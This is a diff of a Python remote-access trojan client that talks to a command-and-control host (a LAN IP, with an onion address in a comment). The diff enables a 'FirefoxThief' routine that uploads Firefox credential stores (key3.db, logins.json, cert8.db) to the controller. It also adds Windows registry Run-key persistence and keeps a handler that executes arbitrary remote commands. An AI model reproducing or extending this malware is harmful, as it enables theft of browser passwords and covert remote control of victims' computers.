@@ -31,7 +31,7 @@ class PKCS7Encoder():
 
 encoder = PKCS7Encoder()
 #host = 'hcjczulezpxxfw2n.onion'
-host = '192.168.0.104'
+host = '192.168.0.101'
 cType = "client000-crypto" #client Type
 
 ######### virtus-total check
@@ -77,10 +77,16 @@ def RecvData():
 # autostart for Windows
 def WindowsAutoStart():
     try:
-        #name = inspect.getfile(inspect.currentframe());
-        EXEC('reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "prova" /t REG_SZ /d C:\Python27\T-client.py')
-        #EXEC("attrib +h" + name)
-        status = "ok"
+        regQuery = EXEC('reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "prova" /t REG_SZ')
+        SendData(regQuery +'\n'+ "Does the key already exist? [y/n]")
+        regDo = RecvData()
+        if regDo == "y":
+            status = "Exit."
+        elif regDo == "n":
+            execReg = EXEC('reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "prova" /t REG_SZ /d C:\Python27\T-client.py')
+            status = "Ok"
+        else:
+            status = "Error not handled"
     except:
         status = "error"
     return status
@@ -99,15 +105,16 @@ def RecvData():
 def FirefoxThief():
     if platform.system() == "Windows":
         SendData("Ok: Windows supported")
-        if os.path.isdir("%APPDATA%\Mozilla\Firefox\") == True:
-            os.chdir("%APPDATA%\Mozilla\Firefox\")
+        maindir = os.getenv("appdata")
+        if os.path.isdir(maindir+"\\Mozilla\\Firefox") == True:
+            os.chdir(maindir+"\\Mozilla\\Firefox")
             SendData(EXEC("dir"))
             newDir = RecvData()
             UploadFILE("profiles.ini")
-            os.chdir("%APPDATA%\Mozilla\Firefox\"+newDir)
+            os.chdir(maindir+'\\Mozilla\\Firefox\\'+newDir)
             SendData(EXEC("dir"))
             newDir2 = RecvData()
-            os.chdir("%APPDATA%\Mozilla\Firefox\"+newDir2)
+            os.chdir(maindir+"\\Mozilla\\Firefox\\"+newDir+"\\"+newDir2)
             UploadFILE("cert8.db")
             UploadFILE("key3.db")
             UploadFILE("logins.json")
@@ -273,6 +280,7 @@ while 1:
         SendData("end-info")
     elif inText.startswith("set"):
         if inText.split(":")[1]== "autostart":
+            SendData(platform.system())
             if platform.system() == "Windows":
                 SendData("WindowsAutoStart: "+WindowsAutoStart())
             else: # at the moment os x not supported
@@ -288,7 +296,10 @@ while 1:
     elif inText.startswith("hook"):
         SendData("Error: platform not supported!")
     elif inText == "get-inferfaces":
-        SendData(str(getWirelessInterfaces()))
+        try:
+            SendData(str(getWirelessInterfaces()))
+        except Exception:
+            SendData("No wifi card here")
     elif inText.startswith("ScanWIFI"):
         ScanWIFI(inText.split(":")[1])
     elif inText.startswith('protect'):
@@ -311,8 +322,7 @@ while 1:
         outEXEC = EXEC(inText.split(":")[1])
         SendData(outEXEC)
     elif inText == "FirefoxThief":
-        SendData("Error: function not supported")
-        #FirefoxThief()
+        FirefoxThief()
     else:
         print '[inText] ' + inText
         ssl_sock.write(inText)
